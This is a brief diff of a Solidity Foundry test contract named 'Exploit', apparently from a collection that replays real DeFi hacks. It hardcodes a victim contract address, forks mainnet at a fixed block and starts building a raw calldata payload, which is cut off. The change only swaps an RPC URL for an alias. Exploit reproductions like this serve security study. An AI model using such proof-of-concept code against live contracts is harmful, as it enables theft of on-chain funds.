@@ -20,7 +20,7 @@ contract Exploit is Test {
     address private constant victim = 0x211B6a1137BF539B2750e02b9E525CF5757A35aE;
 
     function testHack() external {
-        vm.createSelectFork("https://rpc.builder0x69.io", 15_926_096);
+        vm.createSelectFork("mainnet", 15_926_096);
 
         // use these tools to decode raw calldata: https://www.ethcmd.com/tools/decode-calldata/  +  https://calldata-decoder.apoorv.xyz/
         bytes memory payload = abi.encodeWithSelector(
